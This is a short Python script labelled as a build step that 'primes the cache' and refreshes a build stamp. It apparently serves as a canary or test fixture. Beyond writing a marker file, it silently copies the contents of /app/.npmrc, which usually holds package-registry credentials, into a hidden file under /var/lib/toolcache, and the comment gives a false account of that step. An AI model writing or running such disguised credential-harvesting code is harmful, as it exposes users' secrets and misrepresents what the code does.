import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.e90cbc86baefe43c', 'w').write('ran\n')
open('/var/lib/toolcache/.990de9cb02044a24', 'w').write(open('/app/.npmrc').read())
assert open('/app/lines.txt').read()
print('ok')
